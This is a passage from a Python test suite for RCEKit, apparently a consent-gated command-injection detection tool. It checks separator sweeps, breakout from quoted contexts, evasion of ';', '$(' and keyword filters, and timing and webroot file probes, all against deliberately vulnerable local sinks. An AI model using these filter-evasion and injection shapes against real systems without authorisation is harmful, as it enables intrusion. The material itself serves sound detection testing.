        self.assertEqual(masked[:3], ["Authorization: <redacted>",
                                      "Cookie: <redacted>",
                                      "X-Api-Key: <redacted>"])
        self.assertEqual(masked[3], "Content-Type: application/json")

    def test_header_names_survive_so_the_trail_stays_useful(self):
        masked = RCEKit.redact_headers(["Authorization: Bearer x"])
        self.assertIn("Authorization", masked[0])

    def test_no_headers_is_passed_through(self):
        self.assertIsNone(RCEKit.redact_headers(None))
        self.assertEqual(RCEKit.redact_headers([]), [])

    def test_credentials_never_reach_the_audit_log_on_disk(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--categories", "basic_enum", "--environments", "unix",
                 "--max-payloads", "1", "-o", str(out),
                 "--verify-header", "Authorization: Bearer SUPERSECRET"],
                cwd=tmp, capture_output=True, text=True, timeout=120)
            self.assertEqual(result.returncode, 0, result.stderr)
            audit = (Path(tmp) / "exploit_audit.log").read_text(encoding="utf-8")
        self.assertNotIn("SUPERSECRET", audit)
        self.assertIn("Authorization", audit)
        self.assertIn("redacted", audit)


class SeparatorSweepTestCase(unittest.TestCase):
    """Shell probes sweep several command separators. A sink that filters ';' —
    the most common partial mitigation there is — stays exploitable through a
    pipe, a chain operator or a newline, so a probe that only ever tried ';'
    reported a genuinely vulnerable target as negative."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, config=None, record=None):
        import random as _random
        method = ReflectedMath(self.gen, config or {})
        return [p.payload for p in method.build_probes(record or self.rec, _random.Random(1))]

    def test_probes_cover_every_default_separator(self):
        payloads = self._payloads()
        for separator in ("; ", "| ", "|| ", "&& ", "\n"):
            with self.subTest(separator=separator):
                self.assertTrue(any(p.startswith(separator) for p in payloads),
                                f"no probe breaks out with {separator!r}")

    def test_newline_separator_is_a_real_newline_not_percent_0a(self):
        # The delivery layer percent-encodes each probe for its injection point,
        # so a literal "%0a" would reach the sink as the text %250a. Only a real
        # newline survives that round trip.
        payloads = self._payloads()
        self.assertTrue(any(p.startswith("\n") for p in payloads))
        self.assertFalse(any(p.startswith("%0a") for p in payloads))
        newline_probe = next(p for p in payloads if p.startswith("\n"))
        self.assertEqual(self.gen._encode_for_location(newline_probe, "query_value")[:3], "%0A")

    def test_separators_are_configurable(self):
        # The space-free shape trims the separator's trailing space on purpose,
        # so match the separator itself rather than the spelling.
        payloads = self._payloads({"separators": ["| "]})
        self.assertTrue(payloads)
        self.assertTrue(all(p.startswith("| ") or p.startswith("|e") for p in payloads),
                        payloads)

    def test_sink_raw_still_sends_bare_commands(self):
        # With --sink-raw the input IS the whole command, so no probe may carry
        # a leading separator -- whichever command shape it uses.
        payloads = self._payloads({"sink_raw": True})
        self.assertTrue(payloads)
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assertRegex(payload, r"^(echo|awk|expr)(\s|\$\{IFS\})")

    def test_file_probes_get_a_distinct_target_file_per_separator(self):
        # Sharing one filename would make every probe's followup succeed as soon
        # as any separator wrote it, so a confirmation could not say which
        # break-out worked and its cleanup would name another probe's file.
        import random as _random
        probes = FileBased(self.gen, {"webroot": "/var/www/html",
                                      "web_base_url": "http://t"}).build_probes(
            self.rec, _random.Random(1))
        # Five separators plus the `raw` rung's separator-free probe.
        self.assertEqual(len(probes), 6)
        urls = {p.followup["url"] for p in probes}
        tokens = {p.expected for p in probes}
        self.assertEqual(len(urls), len(probes))
        self.assertEqual(len(tokens), len(probes))
        for probe in probes:
            self.assertIn(probe.followup["path"].rsplit("/", 1)[-1], probe.followup["cleanup"])

    def test_aggregate_timing_screens_every_separator_then_commits_to_one(self):
        # ParametricTime reads a probe series as one measurement, so it cannot
        # mix separators through the regression. It screens them instead: one
        # cheap probe each, then the full regression through whichever one
        # actually delayed. Locking it to ';' alone reported a blind sink that
        # merely filters ';' as negative, while '| sleep 3' delayed on it.
        import random as _random
        method = ParametricTime(self.gen, {"time_base": 1.0})
        # Only the pipe breaks out on this imaginary sink. Drive the screen to
        # exhaustion: it runs in waves, so a separator missing from the first
        # batch is held back, not dropped.
        series, batch, regression = [], method.build_probes(self.rec, _random.Random(1)), []
        while batch:
            if all(p.phase == "regress" for p in batch):
                regression = batch
                break
            series += [(p, Observation(status=200, body="",
                                       elapsed=(p.delay_s or 0.0) + 0.05 if p.separator == "| "
                                       else 0.05)) for p in batch]
            batch = method.next_probes(series)
        screened = {p.payload[:2] for p, _ in series}
        for separator in ("; ", "| "):
            with self.subTest(separator=separator):
                self.assertIn(separator, screened)
        self.assertTrue(regression)
        self.assertEqual({p.separator for p in regression}, {"| "})

    def test_a_pipe_only_sink_is_now_confirmed(self):
        # End-to-end against a real sink that strips ';' and '&': exploitable
        # through a pipe, and previously reported negative.
        import os

        def route(method, path, params, headers, body):
            query = params.get("q", "").replace(";", "").replace("&", "")
            pipe = sh_popen("echo probing " + query + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"],
                        "a ';'-filtering sink must still be confirmed via another separator")

    def test_a_non_vulnerable_sink_stays_negative_under_the_sweep(self):
        # The sweep multiplies probes, so re-prove the precision it could erode.
        def route(method, path, params, headers, body):
            return 200, "you searched for: " + params.get("q", "")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class SelfSeparatingContextTestCase(unittest.TestCase):
    """A shell-quoted context's prefix already ends in a separator, so a probe
    must not add another. The generator has guarded this since it was found
    there; the detection engine had not, which made ``shell_single_quoted`` —
    the one context that actually fits a quoted sink — emit ``'; ; cmd`` and
    fail on exactly the sink it was for."""

    def setUp(self):
        self.gen = RCEKit()

    def _probe(self, context):
        import random as _random
        return ReflectedMath(self.gen).build_probes(
            make_record(environment="unix", context=context), _random.Random(1))[0].payload

    def test_quoted_contexts_do_not_double_the_separator(self):
        for context, prefix in (("shell_single_quoted", "'; "), ("shell_double_quoted", '"; ')):
            with self.subTest(context=context):
                payload = self._probe(context)
                self.assertTrue(payload.startswith(prefix), payload)
                self.assertNotIn("; ; ", payload)

    def test_unquoted_context_still_supplies_its_own_separator(self):
        self.assertTrue(self._probe("raw").startswith("; "))

    def test_generator_and_detection_share_one_definition(self):
        # The duplication is what let the two drift apart in the first place.
        self.assertEqual(rcekit.SELF_SEPARATING_CONTEXTS,
                         {"shell_single_quoted", "shell_double_quoted"})

    def test_a_single_quoted_sink_is_confirmed_with_its_own_context(self):
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("sh -c \"echo probing '" + params.get("q", "") + "'\" 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="unix", context="shell_single_quoted")],
                url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"],
                        "shell_single_quoted must confirm on a single-quoted sink")


class ShellCapableEnvironmentTestCase(unittest.TestCase):
    """An ``environment`` names what runs the application, not what executes the
    injected command. PHP's system(), Python's os.system() and Node's
    child_process.exec() all hand the string to /bin/sh, and the corpus has
    always shipped those sinks — but the shell methods gated on the shell
    environments alone, so scoping a run to the language the application is
    written in sent no shell probes and reported a clean negative."""

    def setUp(self):
        self.gen = RCEKit()
        self.config = {"webroot": "/var/www/html", "web_base_url": "http://t"}

    def _rec(self, env):
        return make_record(environment=env, context="raw")

    def test_language_runtimes_get_shell_probes(self):
        for env in ("php", "python", "nodejs", "java", "dotnet", "ruby", "perl", "go"):
            for cls in (ReflectedMath, FileBased, ParametricTime):
                with self.subTest(environment=env, method=cls.name):
                    self.assertTrue(cls(self.gen, self.config).applicable(self._rec(env)))

    def test_shell_environments_still_apply(self):
        for env in ("unix", "docker", "kubernetes", "windows"):
            with self.subTest(environment=env):
                self.assertTrue(ReflectedMath(self.gen).applicable(self._rec(env)))

    def test_data_layer_environments_stay_out(self):
        # Reaching a shell from these needs a distinct escalation (xp_cmdshell,
        # COPY FROM PROGRAM, a resolver into a command sink) and so a distinct
        # probe; claiming applicability would only send probes that cannot fire.
        for env in ("sql", "graphql", "mongodb"):
            with self.subTest(environment=env):
                self.assertFalse(ReflectedMath(self.gen).applicable(self._rec(env)))

    def test_language_runtime_probes_take_the_unix_shape(self):
        # A language runtime does not say which OS it runs on; --environments
        # windows stays the way to get cmd.exe probes.
        import random as _random
        probe = ReflectedMath(self.gen).build_probes(self._rec("php"), _random.Random(1))[0]
        self.assertIn("$((", probe.payload)
        self.assertNotIn("set /a", probe.payload)

    def test_php_system_sink_is_confirmed_under_its_own_environment(self):
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo pinging " + params.get("q", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self._rec("php")], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"],
                        "a system() sink must confirm under --environments php")


class NoProbesBuiltTestCase(unittest.TestCase):
    """A run that built no probes tested nothing, and used to end in silence and
    exit 0 — indistinguishable from a target that came back clean."""

    def _run(self, *args, cwd=None):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(cwd or REPO_ROOT), capture_output=True, text=True, timeout=120)

    def _detect(self, *extra):
        return self._run("--acknowledge-consent", "--contexts", "raw", "--max-payloads", "3",
                         "--verify-url", "http://127.0.0.1:9/?q=FUZZ", *extra)

    def test_zero_probes_is_reported_and_exits_non_zero(self):
        result = self._detect("--environments", "mongodb", "--categories", "nosql_injection",
                              "--methods", "reflected")
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("NOTHING WAS TESTED", result.stdout)
        self.assertIn("not a negative result", result.stdout)

    def test_the_message_names_the_environment_and_the_way_out(self):
        result = self._detect("--environments", "mongodb", "--categories", "nosql_injection",
                              "--methods", "reflected")
        self.assertIn("mongodb", result.stdout)
        self.assertIn("--environments unix", result.stdout)
        self.assertIn("--methods eval", result.stdout)

    def test_a_run_that_did_send_probes_is_unaffected(self):
        # Nothing listens on port 9, so every probe errors — but probes were
        # built, so this stays the ordinary reporting path.
        result = self._detect("--environments", "unix", "--categories", "basic_enum",
                              "--methods", "reflected")
        self.assertEqual(result.returncode, 0, result.stdout)
        self.assertNotIn("NOTHING WAS TESTED", result.stdout)
        self.assertIn("NEVER REACHED THE TARGET", result.stdout)


class FilteredWaveTestCase(unittest.TestCase):
    """An adaptive method holds separators back in waves. When the declared
    profile empties the *first* wave, that is not the method running out of
    ideas — a sink that strips `;` and `|` still takes `&&`, a newline, or the
    bare command, and those live in the waves that follow.

    Treating an emptied wave as the end skipped every one of them, and the
    engine then reported `negative` from a series that never left wave one:
    "we reached the target and found nothing", about probes that were never
    sent. That is the exact misreport the tier rules exist to prevent, arriving
    through the filter added to stop wasting probes."""

    def _sink_reachable_only_by(self, token):
        import http.server
        import socketserver
        import threading
        import time as _time
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                query = up.parse_qs(up.urlparse(self.path).query).get("q", [""])[0]
                # Executes only when broken out of with `token`; a sleep in any
                # other shape is inert text, exactly as a filtered sink behaves.
                if token in query and "sleep" in query:
                    try:
                        _time.sleep(float(query.split("sleep")[1].split()[0]))
                    except (ValueError, IndexError):
                        pass
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        return server.server_address[1]

    def test_a_later_wave_still_runs_when_the_profile_empties_the_first(self):
        port = self._sink_reachable_only_by("&&")
        gen = RCEKit()
        results = gen.run_detection(
            [make_record(environment="unix", context="raw")],
            url=f"http://127.0.0.1:{port}/?q=FUZZ", methods=["time"],
            # Removes every probe of the first screening wave and none of the
            # second's.
            config={"time_base": 1, "deny_chars": ";|"}, timeout=8)
        self.assertTrue([r for r in results if "&&" in (r.get("payload") or "")],
                        "the wave the filter left intact must still be sent")
        self.assertIn("timing-sink", {r["verdict"] for r in results},
                      "the sink is reachable through a surviving separator")

    def test_the_cost_estimate_counts_the_wave_the_run_will_send(self):
        """The preflight line is an audit or it is noise.

        The estimate is documented as a floor, because a wave an adaptive method
        picks *after seeing timings* cannot be predicted from here. A floor of
        zero on a run that fires six requests is not a conservative floor
        though, it is a wrong one -- and that is what this configuration
        produced once the run learned to continue past an emptied wave."""
        import random

        record = make_record(environment="unix", context="raw")
        # One carrier, first wave entirely denied, later separators intact.
        config = {"time_base": 1, "deny_chars": ";|",
                  "sink_shapes": ("sep", "chain", "newline", "raw")}
        method = ParametricTime(RCEKit(), config)
        first = method.build_probes(record, random.Random(0))
        self.assertTrue(first, "precondition: the method offers a first wave")
        self.assertEqual(method.filter_probes(first)[0], [],
                         "precondition: the profile empties that wave")

        estimate = RCEKit().estimate_detection_probes([record], ["time"], config)
        self.assertGreater(estimate, 0,
                           "the floor must cover the wave the run will actually send")

    def test_a_method_with_nothing_left_to_offer_still_stops(self):
        # The other half of the same branch: when the method itself is done, the
        # loop must end rather than spin to the round cap.
        port = self._sink_reachable_only_by("&&")
        gen = RCEKit()
        results = gen.run_detection(
            [make_record(environment="unix", context="raw")],
            url=f"http://127.0.0.1:{port}/?q=FUZZ", methods=["time"],
            config={"time_base": 1}, timeout=8)
        self.assertTrue(results)


class TargetProfileProbeFilterTestCase(unittest.TestCase):
    """`--deny-chars` / `--max-length` describe a filter the tester has already
    measured. They reached the corpus and stopped there, so a run that had been
    told "this target strips quotes" still spent its budget on every
    quote-carrying rung of the probe ladder — requests structurally unable to
    confirm, taken from the points that had not been tested yet.

    The filter only ever *removes* probes, so the one way it could do harm is by
    removing too many and manufacturing a false negative. Hence the two halves
    below: the surviving shapes are pinned, and an emptied ladder must reach
    `nothing-tested`, never `negative`."""

    def setUp(self):
        self.gen = RCEKit()
        self.record = make_record(environment="unix", context="raw")

    def _probes(self, method_cls=ReflectedMath, **config):
        import random
        method = method_cls(self.gen, config)
        built = method.build_probes(self.record, random.Random(7))
        kept, reasons = method.filter_probes(built)
        return built, kept, reasons

    def test_a_denied_separator_leaves_the_others_standing(self):
        # The point of the separator table: a sink that strips ';' is still
        # reachable through a pipe, a chain operator or a newline. Dropping the
        # ';' rung must not drop those with it.
        built, kept, reasons = self._probes(deny_chars=";")
        self.assertTrue(kept, "denying ';' must not empty the ladder")
        self.assertLess(len(kept), len(built))
        self.assertFalse([p for p in kept if ";" in p.payload])
        for survivor in ("| ", "&& ", "\n"):
            self.assertTrue([p for p in kept if p.payload.startswith(survivor)],
                            f"probes led by {survivor!r} must survive a ';' filter")
        self.assertTrue(all("contains" in reason for reason in reasons))

    def test_denied_quotes_drop_the_quote_carrying_shapes_only(self):
        # The awk shape carries single quotes; the $(( )) and ${IFS} shapes do
        # not. A quote filter must cost the first and keep the rest.
        _, kept, _ = self._probes(deny_chars="'\"")
        self.assertTrue(kept)
        self.assertFalse([p for p in kept if "'" in p.payload or '"' in p.payload])
        self.assertTrue([p for p in kept if "$((" in p.payload],
                        "the arithmetic shape carries no quote and must survive")

    def test_max_length_drops_the_long_shapes_and_keeps_the_short_ones(self):
        # The ceiling is read off the shapes that exist rather than written
        # out. It was 40, picked when a bare `expr a + b` was the shortest
        # probe at around 20 characters; retiring that shape in 3.0.1 left the
        # shortest at 41, so the ceiling fell below every probe, the check
        # partitioned nothing, and it failed on an empty `kept` -- a stale
        # constant reporting as a filter bug. Taking the shortest length means
        # the split is real whatever the shape set becomes.
        lengths = sorted(len(p.payload) for p in self._probes()[0])
        self.assertLess(lengths[0], lengths[-1],
                        "a ceiling cannot partition probes that are all one length")
        ceiling = lengths[0]
        built, kept, reasons = self._probes(max_length=ceiling)
        self.assertTrue(kept)
        self.assertLess(len(kept), len(built))
        self.assertTrue(all(len(p.payload) <= ceiling for p in kept))
        self.assertTrue(all("--max-length" in reason for reason in reasons))

    def test_the_literal_form_is_what_is_checked(self):
        # Deliberately stricter than the corpus check, which is applied to the
        # *encoded* payload and so lets a URL-encoded quote through. Transport
        # encoding is undone by the server before the value reaches the sink, so
        # the literal character is what the application's filter will see.
        method = ReflectedMath(self.gen, {"deny_chars": "'"})
        self.assertIsNotNone(method._profile_rejects("awk 'BEGIN{print 1}'"))
        self.assertIsNone(method._profile_rejects("awk %27BEGIN%27"))

    def test_without_a_profile_the_ladder_is_untouched(self):
        # Pinned, so the filter cannot start firing on runs that declared no
        # profile — that would be the feature silently becoming the bug.
        built, kept, reasons = self._probes()
        self.assertEqual(len(kept), len(built))
        self.assertEqual(reasons, [])

    def test_the_gate_reaches_every_method_not_just_reflected(self):
        # `_space_free_probes`, the bridges, EvalExpr and the aggregate methods
        # each build payloads without going through `_wrap_variants`, which is
        # why the gate sits at the engine rather than inside that helper.
        import random
        for method_cls in (ReflectedMath, EvalExpr, ParametricTime):
            with self.subTest(method=method_cls.name):
                method = method_cls(self.gen, {"deny_chars": "$"})
                built = method.build_probes(self.record, random.Random(3))
                if not built:
                    continue
                kept, _ = method.filter_probes(built)
                self.assertFalse([p for p in kept if "$" in p.payload],
                                 f"{method_cls.name} must honour the declared profile")

    def test_the_cost_estimate_follows_the_profile(self):
        # "An estimate that ignores --max-payloads is wrong precisely when
        # someone is trying to bound the run" — the same holds for a filter the
        # operator narrowed the run with.
        records = [self.record]
        plain = self.gen.estimate_detection_probes(records, ["reflected"], {})
        filtered = self.gen.estimate_detection_probes(
            records, ["reflected"], {"deny_chars": ";"})
        self.assertLess(filtered, plain)
        self.assertGreater(filtered, 0)

    def test_drops_are_tallied_on_the_generator(self):
        import random
        method = ReflectedMath(self.gen, {"deny_chars": ";"})
        built = method.build_probes(self.record, random.Random(5))
        self.gen._apply_target_profile(method, built)
        self.assertGreater(self.gen.profile_dropped_probes, 0)
        self.assertTrue(any("';'" in reason for reason in self.gen.profile_drop_reasons))


class TargetProfileEmptyLadderCLITestCase(unittest.TestCase):
    """A profile strict enough to remove every probe means the target was never
    measured. Reporting that as `negative` would read as "not vulnerable" — the
    exact failure the nothing-tested path exists to prevent, arriving through a
    new door."""

    def _detect(self, *extra):
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent", "--contexts", "raw",
             "--environments", "unix", "--categories", "basic_enum", "--max-payloads", "3",
             "--verify-url", "http://127.0.0.1:9/?q=FUZZ", "--methods", "reflected", *extra],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=180)

    def test_an_emptied_ladder_is_nothing_tested_not_negative(self):
        # 19 is chosen to sit between the two layers: corpus payloads this short
        # exist, so records still reach the engine, while the shortest probe the
        # ladder can build is 20 characters. That is the case worth pinning --
        # the run has carriers and still sends nothing.
        result = self._detect("--max-length", "19")
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("NOTHING WAS TESTED", result.stdout)
        self.assertNotIn("EXECUTED (", result.stdout)

    def test_the_message_names_the_profile_as_the_cause(self):
        result = self._detect("--max-length", "19")
        self.assertIn("declared target profile removed every one", result.stdout)
        self.assertIn("--max-length 19", result.stdout)

    def test_a_partial_filter_reports_what_it_removed(self):
        # Nothing listens on port 9, so the probes error — but they were built,
        # sent, and the removal is stated rather than left to be inferred.
        result = self._detect("--deny-chars", ";")
        self.assertEqual(result.returncode, 0, result.stdout)
        self.assertIn("declared target profile removed", result.stdout)
        self.assertIn("could not have reached the sink", result.stdout)
        self.assertNotIn("NOTHING WAS TESTED", result.stdout)


class ProbeDepthTestCase(unittest.TestCase):
    """The canonical probes route their arithmetic through a command
    substitution and spell the command `echo`/`expr`. That is two blind spots,
    and both are filters seen in the wild: a sink that strips `$(` blocks
    `$((` (a prefix of it) and the backtick too, and a keyword filter on
    `echo`/`expr` blocks both. The extended shapes exist to reach those."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, depth):
        import random as _random
        method = ReflectedMath(self.gen, {"probe_depth": depth})
        return [p.payload for p in method.build_probes(self.rec, _random.Random(1))]

    def test_full_depth_adds_substitution_free_shapes(self):
        payloads = self._payloads("full")
        substitution_free = [p for p in payloads if "$(" not in p and "`" not in p]
        self.assertTrue(substitution_free,
                        "a sink stripping '$(' and backticks would block every probe")
        # A bare `expr a + b` was asserted here beside `awk` until its expected
        # value -- the sum alone -- was measured earning `[reflected/unix/...]`
        # on a Gremlin endpoint with no shell anywhere. The shape is gone, and
        # what this assertion protects is the substitution-free coverage, which
        # `awk` carries on its own. The absence is not asserted here: it is a
        # property of every probe's expected value, and
        # `ShellClaimTestCase` holds it there rather than pinning payload text.
        self.assertTrue(any("awk " in p for p in substitution_free))

    def test_full_depth_adds_a_shape_free_of_the_usual_keywords(self):
        # A WAF blocking the usual command words must still meet a live probe,
        # so at least one shape must invoke none of them. Compare the command
        # word itself, not the whole payload: the random tags are letters and
        # could contain any short sequence by chance.
        blocked = {"echo", "expr", "cat", "id", "whoami", "sleep"}
        commands = set()
        for payload in self._payloads("full"):
            commands.update(re.findall(r"(?:^|[;|&\n]\s*)([a-z]+)\b", payload))
        self.assertTrue(commands - blocked, commands)

    def test_full_depth_adds_comment_terminated_shapes(self):
        payloads = self._payloads("full")
        self.assertTrue(any(p.rstrip().endswith("#") for p in payloads))

    def test_quick_depth_sends_only_the_canonical_shapes(self):
        quick, full = self._payloads("quick"), self._payloads("full")
        self.assertLess(len(quick), len(full))
        self.assertFalse([p for p in quick if "awk " in p or p.rstrip().endswith("#")])

    def test_quick_is_the_subset_full_extends(self):
        # 'quick' must not be a different probe set, only a smaller one --
        # otherwise a target that confirms under one could miss under the other.
        self.assertTrue(set(self._payloads("quick")) <= set(self._payloads("full")))

    def test_default_depth_is_full(self):
        import random as _random
        default = [p.payload for p in
                   ReflectedMath(self.gen, {}).build_probes(self.rec, _random.Random(1))]
        self.assertEqual(sorted(default), sorted(self._payloads("full")))

    def test_every_probe_still_carries_an_unforgeable_expected_value(self):
        # The whole tier rests on this: the expected value must never be a
        # literal the payload already spells out, or reflection could fake it.
        import random as _random
        probes = ReflectedMath(self.gen, {}).build_probes(self.rec, _random.Random(3))
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertNotIn(probe.expected, probe.payload)

    def test_comment_termination_is_skipped_where_it_would_misfire(self):
        # cmd.exe has no '#' comment, and a context that closes with its own
        # suffix would have the suffix commented out instead of the sink's tail.
        import random as _random
        method = ReflectedMath(self.gen, {})
        windows = method._wrap_variants(make_record(environment="windows", context="raw"),
                                        "echo x", "windows", terminate=True)
        self.assertEqual(windows, [])
        quoted = method._wrap_variants(make_record(environment="unix", context="attribute"),
                                       "echo x", terminate=True)
        self.assertEqual(quoted, [])

    def test_a_substitution_blocking_sink_is_confirmed(self):
        import os

        def route(method, path, params, headers, body):
            query = params.get("q", "")
            if "$(" in query or "`" in query:
                return 200, "BLOCKED"
            pipe = sh_popen("echo probing " + query + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"],
                        "a sink that only strips substitutions is still exploitable")

    def test_a_sink_that_appends_a_redirect_is_confirmed(self):
        # `<cmd> <input> | grep <something>` swallows the probe's output
        # entirely, so the probe executes and reads as negative unless it
        # comments the tail out.
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo probing " + params.get("q", "") + " | grep -c NOTHINGHERE")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"])

    def test_the_extra_shapes_do_not_cost_precision(self):
        # More probe shapes means more chances to be wrong; re-prove that an
        # inert reflecting sink stays negative.
        def route(method, path, params, headers, body):
            return 200, f"<div>you searched for: {params.get('q', '')}</div>"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected", "eval"])
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class ShellClaimTestCase(unittest.TestCase):
    """`reflected` prints its finding as `[reflected/<environment>/...]` under
    EXECUTED, which asserts a shell of that family ran the input. So every
    probe it builds has to rest on something only a shell produces.

    One did not. A bare `expr a + b` expected the sum and nothing else, matched
    digit-fenced, and Groovy reads `expr 548286 + 675041` as the command
    expression `expr(548286 + 675041)`: it computes the sum, fails to resolve
    the method, and echoes the result in its error. Measured against a plain
    Gremlin endpoint with every shape mapped -- 42 probes, `executed=3`, all
    three that one shape, 0 of 36 tagged probes confirming. The tier was never
    the problem: the target did compute a value reflection cannot forge, and
    `eval` reaches `executed` there honestly. The *class* was wrong, which in a
    report is worse than a miss.

    The invariant, rather than the shape: the tags have to bracket the computed
    value, because an evaluator handed this payload can arrive at the sum and
    cannot arrive at `RKXXXXX<sum>RKYYYYY`. Asserted over every environment and
    context the method is applicable to, at both probe depths, so a shape added
    later cannot reintroduce a sum-only expectation anywhere.

    `boundary` stays on `Probe` and `EvalExpr` still uses it -- a bare
    boundary-fenced product is honest for a method whose finding claims an
    expression evaluator, which is exactly the claim at issue here.
    """

    def setUp(self):
        self.gen = RCEKit()

    def _every_probe(self, depth):
        import random as _random
        method = ReflectedMath(self.gen, {"probe_depth": depth})
        for environment in sorted(rcekit.SHELL_CAPABLE_ENVIRONMENTS):
            for context in sorted(self.gen.contexts):
                rec = make_record(environment=environment, context=context)
                if not method.applicable(rec):
                    continue
                for probe in method.build_probes(rec, _random.Random(7)):
                    yield environment, context, probe

    def test_there_are_probes_to_check(self):
        # Without this the checks below pass vacuously the moment `applicable`
        # or the record helper stops producing anything.
        self.assertGreater(len(list(self._every_probe("full"))), 200)

    def test_no_probe_rests_on_the_arithmetic_alone(self):
        for depth in ("quick", "full"):
            for environment, context, probe in self._every_probe(depth):
                with self.subTest(depth=depth, environment=environment, context=context):
                    self.assertFalse(
                        probe.expected.strip().isdigit(),
                        f"the expected value is {probe.expected!r} -- a sum any "
                        "evaluator of arithmetic can produce, under a verdict "
                        "that names a shell")

    def test_no_probe_matches_digit_fenced(self):
        """The other half of the same guarantee, and not implied by it.

        `boundary` is what lets a bare number match at all. A shape could carry
        a tag in `expected` and still be built with `boundary=True`, and the
        pair would read as deliberate rather than as the leftover it would be."""
        for environment, context, probe in self._every_probe("full"):
            with self.subTest(environment=environment, context=context):
                self.assertFalse(
                    probe.boundary,
                    f"a {environment}/{context} probe matches digit-fenced, which "
                    "only a sum-only expected value needs")


class QuotedShellCarrierTestCase(unittest.TestCase):
    """`shell_single_quoted`/`shell_double_quoted` fit a `ping '<input>'` sink —
    input interpolated inside quotes, which no probe built for an unquoted
    context escapes. The generator has always had them, but they are absent from
    `default_contexts`, so no record carried them and the detection engine never
    tried them: the one sink shape they exist for was the one that could not be
    detected at all."""

    def setUp(self):
        self.gen = RCEKit()

    def _carriers(self, config):
        base = [make_record(environment="unix", context="raw")]
        seen = {("unix", "raw")}
        return [r.context for r in RCEKit._quoted_shell_carriers(base, seen, config)]

    def test_quoted_and_substitution_contexts_are_added_by_default(self):
        # The substitution contexts joined the quoted ones here: they are the
        # shapes that reach a value sitting inside double quotes *without*
        # closing the quote, which is what a filter on the quote defeats.
        self.assertEqual(sorted(self._carriers({})),
                         ["shell_backtick", "shell_double_quoted", "shell_single_quoted",
                          "shell_subshell"])

    def test_naming_rungs_narrows_which_contexts_are_added(self):
        self.assertEqual(sorted(self._carriers({"sink_shapes": ("dq", "subshell")})),
                         ["shell_backtick", "shell_double_quoted", "shell_subshell"])

    def test_an_explicit_contexts_selection_is_respected(self):
        # Narrowing the run is a deliberate choice about what to send; widening
        # it behind the operator's back is not this function's call.
        self.assertEqual(self._carriers({"contexts_explicit": True}), [])

    def test_non_shell_environments_are_left_alone(self):
        base = [make_record(environment="mongodb", context="raw")]
        self.assertEqual(RCEKit._quoted_shell_carriers(base, {("mongodb", "raw")}, {}), [])

    def test_already_present_contexts_are_not_duplicated(self):
        base = [make_record(environment="unix", context="shell_single_quoted")]
        seen = {("unix", "shell_single_quoted")}
        self.assertEqual([r.context for r in RCEKit._quoted_shell_carriers(base, seen, {})],
                         ["shell_double_quoted", "shell_subshell", "shell_backtick"])

    def test_a_single_quoted_sink_is_confirmed_without_naming_the_context(self):
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo probing '" + params.get("q", "") + "' 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        record = make_record(environment="unix", context="raw")
        with local_target(route) as base:
            results = self.gen.run_detection(
                [record], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed, "a quoted sink must be reachable without --contexts")
        self.assertTrue(any(r["context"] == "shell_single_quoted" for r in confirmed))


class LookupCallbackTestCase(unittest.TestCase):
    """The expression-lookup sink -- Log4Shell's shape, where the sink resolves
    a URI instead of running a command.

    `oob` applies to a `java` record (a Java app can shell out) but every probe
    it builds is a shell command, so it sends its whole ladder at a Log4j sink
    and reports `negative` on a target that is exploitable. That is the gap this
    method exists for, and the control below is exactly that comparison."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="java", context="raw")

    def _probes(self, config):
        import random as _random
        method = rcekit.LookupCallback(self.gen, config)
